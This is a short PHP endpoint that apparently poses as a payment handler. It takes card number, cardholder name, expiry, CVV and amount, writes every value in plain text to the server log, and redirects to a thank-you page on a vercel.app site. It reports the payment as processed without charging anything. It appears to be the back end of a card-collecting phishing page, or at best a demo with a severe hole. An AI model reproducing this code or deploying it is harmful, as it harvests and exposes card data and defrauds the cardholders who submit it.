<?php
header('Content-Type: application/json');

// Allow only POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(["error" => "Method not allowed"]);
    exit;
}

// Support both form POST and raw JSON
$data = $_POST ?: json_decode(file_get_contents('php://input'), true);

// Define required fields
$fields = ['reference', 'cardNumber', 'cardName', 'month', 'year', 'cvv', 'amount'];
$missing = array_filter($fields, fn($field) => empty($data[$field]));

// Return error if any required field is missing
if ($missing) {
    http_response_code(400);
    echo json_encode(["error" => "Missing fields", "missing" => array_values($missing)]);
    exit;
}

// Log data to Vercel log (or browser dev tools)
error_log("Payment received: Ref={$data['reference']}, Card={$data['cardNumber']}, Name={$data['cardName']}, Expiry={$data['month']}/{$data['year']}, CVV={$data['cvv']}, Amount={$data['amount']}");

// If the request is from a form submission (i.e., uses $_POST), redirect
if (!empty($_POST)) {
    header("Location: https://strata-connect-green.vercel.app/thank-you");
    exit;
}

// Otherwise, respond with JSON (API usage)
echo json_encode([
    "status" => "success",
    "message" => "Payment processed successfully (simulated).",
    "submittedData" => $data
]);
?>
